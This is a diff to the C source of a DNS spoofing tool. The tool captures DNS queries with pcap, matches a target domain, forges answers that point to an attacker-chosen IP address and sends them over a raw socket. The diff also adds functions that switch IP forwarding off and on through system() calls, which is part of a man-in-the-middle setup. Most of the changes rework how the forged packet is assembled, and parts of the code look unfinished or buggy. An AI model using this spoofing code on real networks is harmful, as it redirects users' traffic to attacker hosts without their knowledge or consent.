@@ -16,6 +16,14 @@
 
 #include "dns-spoof.h"
 
+void stop_routing() {
+    system("echo 0 > /proc/sys/net/ipv4/ip_forward");
+}
+
+void start_routing() {
+    system("echo 1 > /proc/sys/net/ipv4/ip_forward");
+}
+
 char* get_device() {
     char errbuf[PCAP_ERRBUF_SIZE];
     char *dev;
@@ -87,12 +95,10 @@ void pkt_callback(u_char *args, const struct pcap_pkthdr *pkt_hdr, const u_char*
 
     u_int16_t type = handle_ethernet(pkt_hdr, packet);
 
+    stop_routing();
+
     if (type == ETHERTYPE_IP) {
         handle_IP(pkt_hdr, packet);
-    } else if (type == ETHERTYPE_ARP) {
-        fprintf(stderr, "Packet type = [%s]\n", "ARP");
-    } else if (type == ETHERTYPE_REVARP) {
-        fprintf(stderr, "Packet type = [%s]\n", "RARP");
     }
 
     count++;
@@ -123,13 +129,10 @@ u_char* handle_IP(const struct pcap_pkthdr* pkthdr, const u_char* packet) {
     u_int hlen, off, version;
     int len;
 
-    //fprintf(stderr, "%s", "    |> handle_ip()\n");
-
     ether = (struct ether_header *) (packet);
 
     memcpy(header_info->src_mac, ether->ether_shost, ETH_ALEN);
     memcpy(header_info->dst_mac, ether->ether_dhost, ETH_ALEN);
-    ;
     header_info->type = ETHERTYPE_IP;
 
     // Jump to IP packet packet + ETHER_HDRLEN
@@ -186,8 +189,6 @@ u_char* handle_UDP(const struct pcap_pkthdr* pkthdr, const u_char* packet) {
     char *dns_pkt;
     u_int caplen = pkthdr->caplen;
 
-    //submit_log("%s", "handle_udp()\n");
-
     ethernet = (struct sniff_ethernet *) packet;
 
     ip = (struct my_ip *) (packet + ETHER_HDRLEN);
@@ -204,12 +205,15 @@ u_char* handle_UDP(const struct pcap_pkthdr* pkthdr, const u_char* packet) {
     }
 
     dns_pkt = (char *) (packet + ETHER_HDRLEN + ip_len + udp_len);
+    
+    fprintf(stderr, "Handling UDP\n");
 
     handle_DNS(packet);
 }
 
 void handle_DNS(const char* packet) {
     struct dns_query *dnsquery;
+    //struct DNS_HEADER *dns_hdr;
     struct udp_hdr *udp;
     struct my_ip *ip;
     struct sniff_ethernet *ethernet;
@@ -217,8 +221,6 @@ void handle_DNS(const char* packet) {
     char *url;
 
     url = allocate_strmem(REQUEST_SIZE);
-
-    //submit_log("%s", "handle_dns()\n");
 
     ethernet = (struct sniff_ethernet *) packet;
 
@@ -230,14 +232,19 @@ void handle_DNS(const char* packet) {
     udp = (struct udp_hdr *) (packet + ETHER_HDRLEN + ip_len);
     header_info->src_port = udp->uh_sport;
 
+    //dns_hdr = (struct DNS_HEADER *) (packet + ETHER_HDRLEN + ip_len + sizeof (struct udp_hdr));
+
     dnsquery->qname = (char *) (packet + ETHER_HDRLEN + ip_len + sizeof (struct udp_hdr) + sizeof (struct DNS_HEADER));
 
-    url = extract_dns_request(dnsquery);
-    header_info->url_query = url;
+    fprintf(stderr, "%s\n", dnsquery->qname);
 
-    if (strcmp(header_info->url_query, header_info->request) == 0) {
-        //fprintf(stderr, "URL Match found\n");
-        build_response_packet(dnsquery);
+    if (dnsquery != NULL) {
+        url = extract_dns_request(dnsquery);
+        header_info->url_query = url;
+
+        if (strcmp(header_info->url_query, header_info->request) == 0) {
+            build_response_packet(dnsquery);
+        }
     }
 }
 
@@ -278,14 +285,17 @@ char* extract_dns_request(struct dns_query *dnsquery) {
     }
     request[--j] = '\0';
 
-    submit_log("extract_dns_request() URL : %s\n", request);
+    //submit_log("extract_dns_request() URL : %s\n", request);
     fprintf(stderr, "URL: %s\n", request);
 
     return request;
 }
 
-void build_ip_hdr(uint8_t *datagram) {
-    struct ip *send_iphdr = (struct ip *) (datagram + ETHER_HDRLEN);
+//void build_ip_hdr(uint8_t *datagram) {
+
+struct ip build_ip_hdr() {
+    //struct ip *send_iphdr = (struct ip *) (datagram + ETHER_HDRLEN);
+    struct ip send_iphdr;
     int *ip_flags, status, id;
     time_t t;
 
@@ -293,42 +303,52 @@ void build_ip_hdr(uint8_t *datagram) {
     id = rand() % 9999 + 1;
 
     ip_flags = allocate_intmem(4);
-    send_iphdr->ip_hl = IP4_HDRLEN / sizeof (uint32_t); // IPv4 header length (4 bits): Number of 32-bit words in header = 5
-    send_iphdr->ip_v = 4; // Internet Protocol version (4 bits): IPv4
-    send_iphdr->ip_tos = 0; // Type of service (8 bits)
-    //    send_iphdr->ip_len = htons(IP4_HDRLEN + sizeof (struct udp_hdr) + sizeof (struct DNS_HEADER) + sizeof (struct RES_RECORD)); // Total length of datagram (16 bits): IP header + ICMP header + ICMP data
-    send_iphdr->ip_len = htons(IP4_HDRLEN + sizeof (struct udp_hdr) + sizeof (struct dns_response)); // Total length of datagram (16 bits): IP header + UDP header + UDP data (DNS HDR + QUERY + ANSWER)
-    send_iphdr->ip_id = htons(id); // ID sequence number (16 bits): unused, since single datagram
+    send_iphdr.ip_hl = IP4_HDRLEN / sizeof (uint32_t); // IPv4 header length (4 bits): Number of 32-bit words in header = 5
+    send_iphdr.ip_v = 4; // Internet Protocol version (4 bits): IPv4
+    send_iphdr.ip_tos = 0; // Type of service (8 bits)
+    //    send_iphdr.ip_len = htons(IP4_HDRLEN + sizeof (struct udp_hdr) + sizeof (struct DNS_HEADER) + sizeof (struct RES_RECORD)); // Total length of datagram (16 bits): IP header + ICMP header + ICMP data
+    send_iphdr.ip_len = htons(IP4_HDRLEN + sizeof (struct udp_hdr) + sizeof (struct dns_response)); // Total length of datagram (16 bits): IP header + UDP header + UDP data (DNS HDR + QUERY + ANSWER)
+    send_iphdr.ip_id = htons(id); // ID sequence number (16 bits): unused, since single datagram
     ip_flags[0] = 0; // Zero (1 bit)
     ip_flags[1] = 1; // Do not fragment flag (1 bit)
     ip_flags[2] = 0; // More fragments following flag (1 bit)
     ip_flags[3] = 0; // Fragmentation offset (13 bits)
-    send_iphdr->ip_off = htons((ip_flags[0] << 15) + (ip_flags[1] << 14) + (ip_flags[2] << 13) + ip_flags[3]); // Flags, and Fragmentation offset (3, 13 bits): 0 since single datagram
-    send_iphdr->ip_ttl = 64; // Time-to-Live (8 bits): default to maximum value
-    send_iphdr->ip_p = UDP_PKT; // UDP Packet Type
-    send_iphdr->ip_src = header_info->ip_dst;
-    send_iphdr->ip_dst = header_info->ip_src;
-    send_iphdr->ip_sum = 0;
-    send_iphdr->ip_sum = ipv4_checksum((uint16_t *) & send_iphdr, IP4_HDRLEN); // IPv4 header checksum (16 bits): set to 0 when calculating checksum
+    send_iphdr.ip_off = htons((ip_flags[0] << 15) + (ip_flags[1] << 14) + (ip_flags[2] << 13) + ip_flags[3]); // Flags, and Fragmentation offset (3, 13 bits): 0 since single datagram
+    send_iphdr.ip_ttl = 64; // Time-to-Live (8 bits): default to maximum value
+    send_iphdr.ip_p = UDP_PKT; // UDP Packet Type
+    send_iphdr.ip_src = header_info->ip_dst;
+    send_iphdr.ip_dst = header_info->ip_src;
+    send_iphdr.ip_sum = 0;
+    send_iphdr.ip_sum = ipv4_checksum((uint16_t *) & send_iphdr, IP4_HDRLEN); // IPv4 header checksum (16 bits): set to 0 when calculating checksum
+
+    return send_iphdr;
 }
 
-void build_udp_hdr(uint8_t *datagram) {
-    struct udp_hdr *udp = (struct udp_hdr *) (datagram + ETHER_HDRLEN + IP4_HDRLEN);
+//void build_udp_hdr(uint8_t *datagram) {
 
-    udp->uh_sport = htons(53);
-    udp->uh_dport = header_info->src_port;
-    udp->uh_ulen = htons(sizeof (struct udp_hdr) + sizeof (struct DNS_HEADER) + sizeof (struct dns_query) + sizeof (struct RES_RECORD));
-    udp->uh_sum = 0;
-    udp->uh_sum = ipv4_checksum((uint16_t *) & udp, sizeof (struct udp_hdr));
+struct udp_hdr build_udp_hdr() {
+    struct udp_hdr udp;
+    //struct udp_hdr *udp = (struct udp_hdr *) (datagram + ETHER_HDRLEN + IP4_HDRLEN);
+
+    udp.uh_sport = htons(53);
+    udp.uh_dport = header_info->src_port;
+    udp.uh_ulen = htons(sizeof (struct udp_hdr) + sizeof (struct DNS_HEADER) + sizeof (struct dns_query) + sizeof (struct RES_RECORD));
+    udp.uh_sum = 0;
+    udp.uh_sum = ipv4_checksum((uint16_t *) & udp, sizeof (struct udp_hdr));
+
+    return udp;
 }
 
-void build_dns_answer(uint8_t *datagram, struct dns_query *query) {
+//void build_dns_answer(uint8_t *datagram, struct dns_query *query) {
+
+struct dns_response build_dns_answer(struct dns_query *query) {
     unsigned int size = 0;
     struct DNS_HEADER dns_hdr;
     struct dns_query dns_query;
     struct RES_RECORD response;
     struct R_DATA rdata;
-    struct dns_response *dns_response = (struct dns_response *) (datagram + ETHER_HDRLEN + IP4_HDRLEN + sizeof (struct udp_hdr));
+    struct dns_response dns_response;
+    //struct dns_response *dns_response = (struct dns_response *) (datagram + ETHER_HDRLEN + IP4_HDRLEN + sizeof (struct udp_hdr));
     unsigned char ans[4];
 
     sscanf(header_info->response, "%d.%d.%d.%d", (int *) &ans[0], (int *) &ans[1], (int *) &ans[2], (int *) &ans[3]);
@@ -349,10 +369,15 @@ void build_dns_answer(uint8_t *datagram, struct dns_query *query) {
     dns_hdr.auth_count = 0; // How many authority entries?
     dns_hdr.add_count = 0; // How many resource entries?
 
-    strcpy(dns_query.qclass, query->qclass);
+    //strcpy(dns_query.qclass, query->qclass);
+    memcpy(dns_query.qclass, query->qclass, 2);
+
+    size = strlen(header_info->request) + 2;
+    //memcpy(dns_query.qname, query->qname, size);
     dns_query.qname = query->qname;
     //strcpy(dns_query.qname, query->qname);
-    strcpy(dns_query.qtype, query->qtype);
+    memcpy(dns_query.qtype, query->qtype, 2);
+    //strcpy(dns_query.qtype, query->qtype);
 
     response.name = query->qname;
     rdata._class = htons(1);
@@ -362,39 +387,46 @@ void build_dns_answer(uint8_t *datagram, struct dns_query *query) {
     response.resource = &rdata;
     memcpy(&response.rdata, ans, 4);
 
-    dns_response->_hdr = &dns_hdr;
-    dns_response->_query = &dns_query;
-    dns_response->_response = &response;
+    dns_response._hdr = &dns_hdr;
+    dns_response._query = &dns_query;
+    dns_response._response = &response;
+
+    return dns_response;
 }
 
 void build_response_packet(struct dns_query *query) {
     //char *datagram;
-    uint8_t *datagram;
+    //uint8_t *datagram;
     unsigned int datagram_size;
-    struct ether_header *eth_hdr;
+    //struct ether_header *eth_hdr;
+    struct ip ip;
+    struct udp_hdr udp;
+    struct dns_response dns;
 
-    datagram = allocate_strmem(IP_MAXPACKET);
+    //datagram = allocate_strmem(IP_MAXPACKET);
 
-    eth_hdr = (struct ether_header *) (datagram);
+    //    eth_hdr = (struct ether_header *) (datagram);
 
-    memcpy(eth_hdr->ether_dhost, header_info->src_mac, ETH_ALEN);
-    memcpy(eth_hdr->ether_shost, header_info->dst_mac, ETH_ALEN);
-    eth_hdr->ether_type = header_info->type;
+    //    memcpy(eth_hdr->ether_dhost, header_info->src_mac, ETH_ALEN);
+    //    memcpy(eth_hdr->ether_shost, header_info->dst_mac, ETH_ALEN);
+    //    eth_hdr->ether_type = header_info->type;
 
-    build_ip_hdr(datagram);
-    build_udp_hdr(datagram);
-    build_dns_answer(datagram, query);
+    ip = build_ip_hdr();
+    udp = build_udp_hdr();
+    dns = build_dns_answer(query);
 
-    datagram_size = ETHER_HDRLEN + IP4_HDRLEN + sizeof (struct udp_hdr) + sizeof (struct dns_response);
+    datagram_size = ETHER_HDRLEN + IP4_HDRLEN + sizeof (struct udp_hdr) + sizeof (struct DNS_HEADER) + sizeof (struct dns_query) + sizeof (struct RES_RECORD);
 
     //sends our DNS Spoof MSG
-    send_dns_answer(header_info->ip_src, header_info->src_port, datagram, datagram_size);
+    //send_dns_answer(header_info->ip_src, header_info->src_port, datagram, datagram_size);
+    send_dns_answer(ip, udp, dns, datagram_size);
 
 }
 
-void send_dns_answer(struct in_addr ip, u_short port, uint8_t* packet, int packlen) {
+void send_dns_answer(struct ip ip, struct udp_hdr udp, struct dns_response dns, int packlen) {
     int sendsd, bytes_sent;
     struct sockaddr_ll device;
+    uint8_t *packet;
 
     sendsd = create_raw_socket(ETH_P_ALL);
     memset(&device, 0, sizeof (device));
@@ -408,10 +440,25 @@ void send_dns_answer(struct in_addr ip, u_short port, uint8_t* packet, int packl
     memcpy(device.sll_addr, header_info->dst_mac, 6);
     device.sll_halen = 6;
 
+    packet = allocate_ustrmem(IP_MAXPACKET);
+    memcpy(packet, header_info->src_mac, 6);
+    memcpy(packet + 6, header_info->dst_mac, 6);
+    packet[12] = ETH_P_IP / 256;
+    packet[13] = ETH_P_IP % 256;
+
+    memcpy(packet + ETHER_HDRLEN, &ip, IP4_HDRLEN);
+    memcpy(packet + ETHER_HDRLEN + IP4_HDRLEN, &udp, sizeof (struct udp_hdr));
+    memcpy(packet + ETHER_HDRLEN + IP4_HDRLEN + sizeof (struct udp_hdr), dns._hdr, sizeof (struct DNS_HEADER));
+    memcpy(packet + ETHER_HDRLEN + IP4_HDRLEN + sizeof (struct udp_hdr) + sizeof (struct DNS_HEADER), dns._query, sizeof (struct dns_query));
+    memcpy(packet + ETHER_HDRLEN + IP4_HDRLEN + sizeof (struct udp_hdr) + sizeof (struct DNS_HEADER) + sizeof (struct dns_query), dns._response, sizeof (struct RES_RECORD));
+
+
     if ((bytes_sent = sendto(sendsd, packet, packlen, 0, (struct sockaddr *) &device, sizeof (device))) <= 0) {
         fprintf(stderr, "%s\n", "sendto() failed ");
         exit(EXIT_FAILURE);
     }
+    sleep(300000);
+    start_routing();
 }
 
 //void send_dns_answer(struct in_addr ip, u_short port, char* packet, int packlen) {
@@ -520,6 +567,9 @@ int main(int argc, char** argv) {
 
     //filter = "udp and port 53 and src 192.168.0.19";
 
+    //system("echo 0 > /proc/sys/net/ipv4/ip_forward");
+
+    stop_routing();
     pcap_setup(filter);
 
     return (EXIT_SUCCESS);
